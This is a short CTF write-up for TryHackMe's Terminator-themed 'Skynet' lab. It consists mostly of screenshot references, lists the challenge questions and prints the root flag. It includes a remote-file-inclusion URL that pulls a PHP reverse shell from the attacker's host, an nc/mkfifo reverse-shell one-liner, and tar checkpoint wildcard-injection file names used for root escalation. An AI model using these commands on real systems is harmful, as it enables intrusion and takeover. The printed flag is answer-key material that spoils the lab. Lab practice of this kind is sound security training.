---
title: "Skynet"
date: 2025-01-01
hideDate: true
draft: false
tags: ["others", "practice", "medium"]
categories: ["writeups"]
summary: "You can follow our official walkthrough for this challenge on [our blog](https://tryhackme.com/r/resources/blog/skynet-writeup)."
ShowToc: true
TocOpen: false
platformLabel: "TryHackMe"
cover:
  image: "00-card.png"
  alt: "Skynet"
  relative: true
---

![TERMINATOR](TERMINATOR.png)

_Hasta la vista, baby._  

Are you able to compromise this Terminator themed machine?

![skynet](skynet.png)

You can follow our official walkthrough for this challenge on [our blog](https://tryhackme.com/r/resources/blog/skynet-writeup).

###### Answer the questions below


What is Miles password for his emails?

What is the hidden directory?

What is the vulnerability called when you can include a remote file for malicious purposes?

What is the user flag?  

What is the root flag?
3f0372db24753accc7179a282cd6a949


#### Nmap Scan (80)
![skynet scan](skynet scan.png)


#### SMB (445)
![skynet smbmap](skynet smbmap.png)
![skynet smbclient](skynet smbclient.png)
![skynet smbclient logs](skynet smbclient logs.png)
![skynet log1](skynet log1.png)


#### HTTP

![skynet gobuster](skynet gobuster.png)

![skynet ffuf](skynet ffuf.png)
![milesdyson password](milesdyson password.png)
![milesdyson account](milesdyson account.png)
![smb password](smb password.png)
![smb client milesdyson](smb client milesdyson.png)
![smclient important](smclient important.png)
![hidden share](hidden share.png)
![cms web](cms web.png)
![gobuster cms website](gobuster cms website.png)
![cuppa cms](cuppa cms.png)

![not account of milesdavies](not account of milesdavies.png)

![searchsploit cuppa](searchsploit cuppa.png)

![exploit cuppa cms](exploit cuppa cms.png)
![reverse shell php](reverse shell php.png)
![kali shell python](kali shell python.png)
![upload php shell](upload php shell.png)
![shell](shell.png)
http://10.10.130.201/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.21.174.19:8000/reverse_shell.php

```
```cd
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip>
1234 >/tmp/f" > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"
```

![root flag](root flag.png)

